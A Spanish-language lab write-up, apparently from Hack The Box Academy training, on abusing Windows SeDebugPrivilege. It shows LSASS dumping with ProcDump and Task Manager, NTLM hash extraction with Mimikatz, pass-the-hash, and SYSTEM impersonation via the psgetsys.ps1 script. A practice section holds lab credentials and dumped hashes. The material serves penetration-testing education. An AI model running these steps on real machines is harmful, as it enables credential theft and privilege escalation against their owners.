
# SeDebugPrivilege

Para ejecutar una aplicación o un servicio en particular o ayudar con la resolución de problemas, se le puede asignar a un usuario el [privilegio SeDebug](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/debug-programs) en lugar de agregar la cuenta al grupo de administradores. Este privilegio se puede asignar a través de una política de grupo local o de dominio, en `Computer Settings > Windows Settings > Security Settings`. De manera predeterminada, solo se les otorga este privilegio a los administradores, ya que se puede utilizar para capturar información confidencial de la memoria del sistema o acceder/modificar estructuras del kernel y de la aplicación. Este derecho se puede asignar a los desarrolladores que necesitan depurar nuevos componentes del sistema como parte de su trabajo diario. Este derecho de usuario se debe otorgar con moderación porque cualquier cuenta a la que se le asigne tendrá acceso a componentes críticos del sistema operativo.

Durante una prueba de penetración interna, suele ser útil utilizar sitios web como LinkedIn para recopilar información sobre los usuarios potenciales a los que dirigirse. Supongamos, por ejemplo, que estamos recuperando muchos hashes de contraseñas NTLMv2 utilizando `Responder` o `Inveigh`. En ese caso, es posible que queramos centrar nuestros esfuerzos de descifrado de hashes de contraseñas en posibles cuentas de alto valor, como desarrolladores que tienen más probabilidades de tener este tipo de privilegios asignados a sus cuentas. Un usuario puede no ser un administrador local en un host, pero tener derechos que no podemos enumerar de forma remota utilizando una herramienta como BloodHound. Esto valdría la pena comprobarlo en un entorno en el que obtenemos credenciales para varios usuarios y tenemos acceso RDP a uno o más hosts, pero sin privilegios adicionales.

![imagen](https://academy.hackthebox.com/storage/modules/67/debug.png)

Después de iniciar sesión como usuario asignado al derecho `Debug programs` y abrir un shell elevado, vemos que `SeDebugPrivilege` aparece en la lista.

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeDebugPrivilege                          Debug programs                                                     Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
```

Podemos utilizar [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) de la suite [SysInternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) para aprovechar este privilegio y volcar la memoria del proceso. Un buen candidato es el proceso del Servicio de subsistema de autoridad de seguridad local ( [LSASS](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service) ), que almacena las credenciales del usuario después de que este inicia sesión&#x20;

```
C:\htb> procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:25:45] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[15:25:45] Dump 1 writing: Estimated dump file size is 42 MB.
[15:25:45] Dump 1 complete: 43 MB written in 0.5 seconds
[15:25:46] Dump count reached.
```

## <mark style="color:purple;">Mimikatz</mark>

Vemos que se ha realizado correctamente y podemos cargarlo en `Mimikatz` mediante el comando `sekurlsa::minidump`. Después de emitir el comando `sekurlsa::logonPasswords`, obtenemos el hash NTLM de la cuenta de administrador local que inició sesión localmente. Podemos utilizar esto para realizar un ataque de paso del hash para movernos lateralmente si se utiliza la misma contraseña de administrador local en uno o varios sistemas adicionales (algo común en organizaciones grandes).

{% hint style="info" %}
Nota: Siempre es una buena idea escribir "`log`" antes de ejecutar cualquier comando en "Mimikatz" de esta manera, toda la salida del comando se colocará en un archivo "`.txt`". Esto es especialmente útil cuando se vuelcan credenciales de un servidor que puede tener muchos conjuntos de credenciales en la memoria.
{% endhint %}

```cmd-session
C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 23196355 (00000000:0161f2c3)
Session           : Interactive from 4
User Name         : DWM-4
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2021 3:00:57 PM
SID               : S-1-5-90-0-4
        msv :
        tspkg :
        wdigest :
         * Username : WINLPE-SRV01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

<SNIP> 

Authentication Id : 0 ; 23026942 (00000000:015f5cfe)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 3/31/2021 2:59:52 PM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000
        msv :
         [00000003] Primary
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * NTLM     : cf3a5525ee9414229e66279623ed5c58
         * SHA1     : 3c7374127c9a60f9e5b28d3a343eb7ac972367b2
        tspkg :
        wdigest :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        kerberos :
         * Username : jordan
         * Domain   : WINLPE-SRV01
         * Password : (null)
        ssp :
        credman :

<SNIP>

```

Supongamos que no podemos cargar herramientas en el objetivo por cualquier motivo, pero tenemos acceso RDP. En ese caso, podemos hacer un volcado de memoria manual del proceso `LSASS` a través del Administrador de tareas navegando hasta la pestaña `Details`, eligiendo el proceso `LSASS` y seleccionando `Create dump file`. Después de descargar este archivo de vuelta a nuestro sistema de ataque, podemos procesarlo usando Mimikatz de la misma manera que en el ejemplo anterior.

![imagen](https://academy.hackthebox.com/storage/modules/67/WPE_taskmgr_lsass.png)

***

## <mark style="color:purple;">Ejecución remota de código como SYSTEM</mark>

También podemos aprovechar un RCE  `SeDebugPrivilege`. Con esta técnica, podemos elevar nuestros privilegios a SYSTEM iniciando un [proceso ](https://decoder.cloud/2018/02/02/getting-system/)[secundario](https://docs.microsoft.com/en-us/windows/win32/procthread/child-processes) y utilizando los derechos elevados otorgados a nuestra cuenta a través de `SeDebugPrivilege` para alterar el comportamiento normal del sistema para heredar el token de un [proceso primario](https://docs.microsoft.com/en-us/windows/win32/procthread/processes-and-threads) y suplantarlo. Si apuntamos a un proceso primario que se ejecuta como SYSTEM (especificando el ID de proceso (o PID) del proceso de destino o programa en ejecución), entonces podemos elevar nuestros derechos rápidamente. Veamos esto en acción.

Primero, transfiera este [script de PoC](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1) al sistema de destino. A continuación, simplemente cargue el script y ejecútelo con la siguiente sintaxis:

```powershell
[MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
```

Ten en cuenta que debemos agregar un tercer argumento en blanco `""` al final para que el PoC funcione correctamente.

El script PoC ha recibido una actualización. Visite su repositorio de GitHub y revise su uso.

{% embed url="<https://github.com/decoder-it/psgetsystem>" %}

En primer lugar, abra una PowerShell con privilegios elevados (haga clic con el botón derecho, ejecútela como administrador e ingrese las credenciales del usuario `jordan`). A continuación, escriba `tasklist` para obtener una lista de los procesos en ejecución y los PID correspondientes.

```powershell-session
PS C:\htb> tasklist 

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        116 K
smss.exe                       340 Services                   0      1,212 K
csrss.exe                      444 Services                   0      4,696 K
wininit.exe                    548 Services                   0      5,240 K
csrss.exe                      556 Console                    1      5,972 K
winlogon.exe                   612 Console                    1     10,408 K
```

Aquí podemos apuntar a la ejecución de `winlogon.exe` bajo el `PID 612`, que sabemos que se ejecuta como SYSTEM en Windows.

![imagen](https://academy.hackthebox.com/storage/modules/67/psgetsys_winlogon.png)

También podríamos usar el cmdlet [Get-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2) para obtener el PID de un proceso conocido que se ejecuta como SYSTEM (como LSASS) y pasar el PID directamente al script, reduciendo la cantidad de pasos necesarios.

![imagen](https://academy.hackthebox.com/storage/modules/67/psgetsys_lsass.png)

Existen otras herramientas como [esta](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC) para abrir un shell SYSTEM cuando tenemos `SeDebugPrivilege`. A menudo no tendremos acceso RDP a un host, por lo que tendremos que modificar nuestros PoC para devolver un reverse shell a nuestro host de ataque como SYSTEM u otro comando, como agregar un usuario administrador. Experimente con estos PoC y vea de qué otras formas puede lograr acceso SYSTEM, especialmente si no tiene una sesión completamente interactiva, como cuando logra la inyección de comandos o tiene una conexión web shell o shell inversa como el usuario con `SeDebugPrivilege`. Ten estos ejemplos en mente en caso de que alguna vez se encuentre en una situación en la que volcar LSASS no resulte en ninguna credencial útil (aunque podemos obtener acceso SYSTEM con solo el hash NTLM de la máquina, pero eso está fuera del alcance de este módulo) y un shell o RCE como SYSTEM sería beneficioso.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 10.129.43.43 (ACADEMY-WINLPE-SRV01)

RDP con el usuario "jordan" y la contraseña "HTB_@cademy_j0rdan!"
```

> Aproveche los derechos de `SeDebugPrivilege` y obtén el hash de contraseña NTLM para la cuenta `sccm_svc`.

### Comprobar privilegios del usuario

```
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeDebugPrivilege              Debug programs                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

El usuario Jordan tiene habilitado el privilegio `SeDebugPrivilege`.

### Ver procesos en ejecución

Vamos a ver los procesos en ejecución:

```
PS C:\Tools> tasklist

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
System Idle Process              0 Services                   0          4 K
System                           4 Services                   0        140 K
smss.exe                       332 Services                   0      1,212 K
csrss.exe                      440 Services                   0      4,388 K
wininit.exe                    544 Services                   0      4,904 K
csrss.exe                      552 Console                    1      4,824 K
winlogon.exe                   608 Console                    1     10,312 K
```

Identificamos la ejecución de `winlogon.exe` bajo el `PID 608`, que sabemos que se ejecuta como SYSTEM en Windows.

### Elevación de privilegios

Vamos a copiar el raw de esta binario y creamos un nuevo archivo.ps1 en la máquina  objetivo:

{% embed url="<https://github.com/decoder-it/psgetsystem/blob/master/psgetsys.ps1>" %}

### **Carga el script en la sesión actual**

PowerShell no ejecuta scripts automáticamente por razones de seguridad. Debes "`dot-source`" el script para importar sus funciones en la sesión:

```powershell
. C:\Tools\psgetsys.ps1
```

{% hint style="info" %}
**Nota:** El punto (`.`) antes de la ruta es importante para que las funciones del script queden disponibles en la sesión actual.
{% endhint %}

### Ejecución del script

```powershell
PS C:\Tools> . C:\Tools\psgetsys.ps1
PS C:\Tools> ImpersonateFromParentPid -ppid 608 -command "C:\Windows\System32\cmd.exe"
```

<figure><img src="/files/bAn0S0oFXTRrABJQ1c8R" alt=""><figcaption></figcaption></figure>

### Extracción de hashes

Vamos a usar Mimikatz desde la CDM de SYSTEM:

```
C:\Tools\Mimikatz\x64\mimikatz.exe

C:\htb> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # log
Using 'mimikatz.log' for logfile : OK

```

Esto nos crea un archivo de log, ya que en la CMD de SYSTEM que nos abre no nos permite hacer scroll y ver todo el contenido.

```
privilege::debug

sekurlsa::logonpasswords

Authentication Id : 0 ; 256097 (00000000:0003e861)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 2/14/2025 8:09:40 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b5**********
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8

<----SNIP---->
```

Obtenemos el hash de la cuenta privilegiada `sccm_svc`
